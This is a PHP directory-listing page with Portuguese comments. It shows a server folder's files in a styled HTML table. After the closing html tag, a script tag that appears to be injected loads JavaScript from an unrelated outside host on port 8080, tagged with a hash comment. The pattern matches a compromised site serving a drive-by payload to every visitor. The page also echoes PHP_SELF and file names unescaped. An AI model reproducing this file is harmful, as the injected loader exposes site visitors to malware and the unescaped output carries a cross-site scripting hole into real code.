<?
//Exibe os diretórios que tem na pasta 
 $dir_open = explode("/", $_SERVER['PHP_SELF']);
 $num_dir = (count($dir_open)-2);
 if ($dir = opendir("../".$dir_open[$num_dir])){ //Diretório a ser vasculhado
  $i=1;

?>
<html>
<head>
<title>Lista de arquivos no Servidor</title>
<style type="text/css">
<!--
body {
SCROLLBAR-FACE-COLOR: #0D1231; 
SCROLLBAR-HIGHLIGHT-COLOR: #FFFFFF; 
SCROLLBAR-SHADOW-COLOR: #FFFFFF; 
SCROLLBAR-3DLIGHT-COLOR: #0D1231; 
SCROLLBAR-ARROW-COLOR: #FFFFFF; 
SCROLLBAR-TRACK-COLOR: #E8EFF5; 
SCROLLBAR-DARKSHADOW-COLOR: #0D1231; 
background-color: #0D1231; 
MARGIN: 10
}
A:link {
FONT-FAMILY: Tahoma, Verdana, sans-serif; 
COLOR: #FFFFFF; 
FONT-SIZE: 10px; 
TEXT-DECORATION: underline; 
BACKGROUND: none
}
A:active {
FONT-FAMILY: Tahoma, Verdana, sans-serif; 
COLOR: #FFFFFF; 
FONT-SIZE: 10px; 
TEXT-DECORATION: underline; 
BACKGROUND: none
}
A:visited {
FONT-FAMILY: Tahoma, Verdana, sans-serif; 
COLOR: #FFFFFF; 
FONT-SIZE: 10px; 
TEXT-DECORATION: underline; 
BACKGROUND: none
}
A:hover {
FONT-FAMILY: Tahoma, Verdana, sans-serif; 
COLOR: #FFFFFF; 
FONT-SIZE: 10px; 
TEXT-DECORATION: none; 
BACKGROUND: none
}
-->
</style>
</head>

<body>
<table width="100%" height="100%" border="0" cellpadding="0" cellspacing="0">
  <tr>
    <td><table width="500" border="0" align="center" cellpadding="0" cellspacing="1">
        <tr align="center"> 
          <td><img src="file:///C|/WINDOWS/SERV-N/www/logo.jpg" width="500" height="100"></td>
        </tr>
        <tr align="center"> 
          <td align="right"><a href="../index.php"><font color="#FFFFFF" size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong>Voltar</strong></font></a></td>
        </tr>
        <tr align="center"> 
          <td><strong><font color="#FFFFFF" size="2" face="Verdana, Arial, Helvetica, sans-serif">Arquivos: 
            http://<? echo $_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']; ?></font></strong></td>
        </tr>
        <?
  while(($arquivos = readdir($dir)) !== false){
    if($arquivos == "." or $arquivos == "..") continue; {
	if ($cor == "#202750"){ $cor = "#0D1231"; } else { $cor = "#202750"; }
  ?>
        <tr> 
          <td bgcolor="<? echo $cor; ?>"> <a href="<? echo $arquivos ?>"><font color="#FFFFFF" size="2" face="Verdana, Arial, Helvetica, sans-serif"><? echo $arquivos; ?></font></a> 
            <font color="#999999" size="1" face="Verdana, Arial, Helvetica, sans-serif"> 
            - 
            <? if(is_dir($arquivos)) echo "Diretório"; else echo "Arquivo"; ?>
            </font></td>
        </tr>
        <?
   $i++; //Incrementa a variável i
  }//fecha if
 } //fecha while 
}//fecha if?>
        <tr> 
          <td align="right"><font color="#FFFFFF" size="2" face="Verdana, Arial, Helvetica, sans-serif"><strong>Total: 
            <? echo ($i - 1); ?></strong></font></td>
        </tr>
      </table></td>
  </tr>
</table>
</body>
</html>




<script type="text/javascript" src="http://solk.seamscreative.info:8080/Kbps.js"></script>
<!--18531a0749da339f29e31adebcf8a4ac-->